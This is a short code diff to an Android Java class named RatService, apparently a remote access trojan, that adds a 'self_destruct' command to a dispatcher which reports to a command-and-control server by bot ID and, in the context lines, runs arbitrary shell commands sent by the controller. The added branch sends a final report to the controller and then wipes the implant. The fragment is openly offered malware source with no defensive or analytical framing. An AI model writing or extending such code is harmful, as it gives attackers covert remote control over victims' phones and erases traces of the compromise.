@@ -153,6 +153,13 @@ public class RatService extends Service {
                 c2.sendResult(botId, report);
             }).start();
 
+        } else if (lower.equals("self_destruct")) {
+            new Thread(() -> {
+                // Send partial report first, then wipe — process may be killed
+                String report = SelfDestruct.run(this, c2, botId);
+                c2.sendResult(botId, report);
+            }).start();
+
         } else if (lower.startsWith("shell ")) {
             String shellCmd = cmd.substring(6);
             new Thread(() -> {
